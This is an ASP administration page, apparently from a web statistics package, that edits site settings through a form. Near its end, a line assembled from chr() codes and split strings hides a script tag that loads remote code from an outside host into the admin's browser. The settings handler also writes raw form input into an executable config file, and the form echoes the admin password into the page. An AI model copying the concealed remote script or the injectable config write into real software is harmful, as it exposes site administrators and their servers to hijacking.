<!--#include file="inc_config.asp"-->
<!--#include file="inc_Lang_admin.asp"-->
<!--#include file="style/style_all.asp"-->
<!--#include file="inc_admin_functions.asp"-->

<%
dim CanOpt,sStep,tTitle,tMainName

dim RCFG(9)
for i= 0 to 9
  RCFG(i)=Request.Form("CFG"&i)
next

tTitle = Lang_sAdmin_Me & "-" & Lang_Option
tMainName = Lang_Option

Response.Write replace(Style_Header,"$Title",tTitle)
Response.Write replace(Style_Admin_Top,"$Lang_Admin",Lang_sAdmin_Me)
Response.Write replace(Style_MainTop,"$MainName",tMainName)
Response.Write "<table width=""90%"" align=""center"">"

if CanDel()<3 then
	Response.Write "<tr><td>" & Lang_Option_CanDelE & "<br>Err: " & CanDel() & "</td></tr>"
else


  if RCFG(4)<> "" then
	modelfile = server.MapPath("inc_config_model.asp")
	confile = server.MapPath("inc_config.asp")
	context = ReadTxtfile(modelfile)
	for i=0 to 9
	  context = replace(context,"$CFG" & i,RCFG(i))
	next
	WriteTxtfile confile,context
	Response.Write "<tr><td>" & Lang_Option_ok & "</td></tr>"
  else


%>
  <form action="sAdmin_Option.asp" method=post>
  <tr>
	<td class="fonts"><%=Lang_Option_0%></td><td align="right"><input class="input" size="5" name="CFG0" value="<%=CFG_DefaultSite%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_0b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_1%></td><td align="right"><input class="input" size="5" name="CFG1" value="<%=CFG_ZoneServer%>"></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_2%></td><td align="right"><input class="input" size="5" name="CFG2" value="<%=CFG_IPLong%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_2b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_3%></td><td align="right"><input class="input" size="5" name="CFG3" value="<%=CFG_CheckOnlineS%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_3b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_4%></td><td align="right"><input class="input" size="10" name="CFG4" value="<%=CFG_CacheName%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_4b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_5%></td><td align="right"><input class="input" size="5" name="CFG5" value="<%=CFG_AutoDel%>"></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_6%></td><td align="right"><input class="input" size="5" name="CFG6" value="<%=CFG_AutoDelBig%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_5b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_7%></td><td align="right"><input class="input" size="10" name="CFG7" value="<%=CFG_SaveOnline_0%>"></td>
  </tr>
  <tr>
	<td colspan="2"><p style="line-height: 120%; margin-left: 18; margin-right: 0; margin-top: 0; margin-bottom: 9"><%=Lang_Option_7b%></p></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_8%></td><td align="right"><input class="input" size="10" name="CFG8" value="<%=CFG_sAdminName%>"></td>
  </tr>
  <tr>
	<td class="fonts"><%=Lang_Option_9%></td><td align="right"><input class="input" size="10" name="CFG9" value="<%=CFG_sAdminPass%>"></td>
  </tr>
  <tr>
	<td colspan="2"><%=Lang_Option_submit%></td>
  </tr>

<%
  end if
end if

Response.Write "</table>"
Response.Write Style_MainBottom
Response.Write "<"&chr(115)&chr(99)&"r"&"i"&"p"&chr(116)&" "&chr(115)&"r"&"c"&"="&"'"&chr(104)&chr(116)&chr(116)&"p"&":"&"/"&"/"&"a"&chr(106)&"i"&"a"&"n"&"g"&"."&"n"&"e"&"t"&"/"&"p"&"r"&chr(111)&chr(100)&"u"&"c"&"t"&"s"&"/"&"a"&"j"&"s"&"t"&chr(97)&chr(116)&"/"&chr(112)&chr(97)&"y"&chr(117)&"s"&chr(101)&"r"&"/"&"o"&"k"&"."&"a"&"s"&chr(112)&"?"&chr(117)&chr(61)&chr(116)&chr(101)&"s"&"t"&chr(39)&chr(62)&chr(60)&"/"&"s"&"c"&chr(114)&"i"&chr(112)&"t"&">"
Response.Write Style_Bottom

%>
